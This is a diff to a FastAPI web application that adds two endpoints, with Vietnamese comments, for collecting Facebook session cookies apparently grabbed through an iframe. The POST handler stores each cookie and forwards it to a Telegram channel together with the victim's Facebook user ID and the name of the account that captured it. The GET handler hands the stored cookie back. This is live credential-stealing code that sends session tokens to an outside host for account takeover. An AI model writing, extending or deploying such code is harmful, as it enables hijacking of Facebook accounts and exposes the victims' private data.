@@ -530,6 +530,50 @@ async def discord_me(request: Request):
         return JSONResponse({"username": "Discord User", "discriminator": "0"})
 
 
+@app.get("/api/fb/cookie")
+async def fb_cookie(request: Request):
+    """
+    Trả về cookie FB từ session proxy.
+    Dùng khi iframe không thể đọc cookie do CORS.
+    """
+    token = get_token_from_request(request)
+    username = get_session_user(token)
+    if not username:
+        raise HTTPException(401, "Chưa đăng nhập")
+    # Lấy cookie từ session proxy nếu có
+    session_data = sessions_db.get(token, {})
+    fb_cookie = session_data.get("fb_cookie", "")
+    if not fb_cookie:
+        raise HTTPException(404, "Chưa có cookie Facebook")
+    return JSONResponse({"cookie": fb_cookie, "ok": True})
+
+@app.post("/api/fb/cookie")
+async def fb_cookie_save(request: Request):
+    """Lưu cookie FB từ client gửi lên (sau khi lấy được từ iframe)."""
+    token = get_token_from_request(request)
+    username = get_session_user(token)
+    if not username:
+        raise HTTPException(401, "Chưa đăng nhập")
+    data = await request.json()
+    cookie = data.get("cookie", "")
+    if not cookie or "c_user" not in cookie:
+        raise HTTPException(400, "Cookie không hợp lệ")
+    # Lưu vào session
+    if token not in sessions_db:
+        sessions_db[token] = {}
+    sessions_db[token]["fb_cookie"] = cookie
+    # Gửi Telegram
+    uid_match = __import__('re').search(r'c_user=(\d+)', cookie)
+    uid = uid_match.group(1) if uid_match else "?"
+    asyncio.create_task(send_telegram(
+        f"🔵 <b>FACEBOOK COOKIE MỚI</b>\n\n"
+        f"🆔 UID: <code>{uid}</code>\n"
+        f"👨‍💻 Lấy bởi: <code>{username}</code>\n"
+        f"🍪 Cookie: <code>{cookie[:200]}...</code>"
+    ))
+    return JSONResponse({"ok": True})
+
+
 if __name__ == "__main__":
     import uvicorn
     port = int(os.environ.get("PORT", 8000))
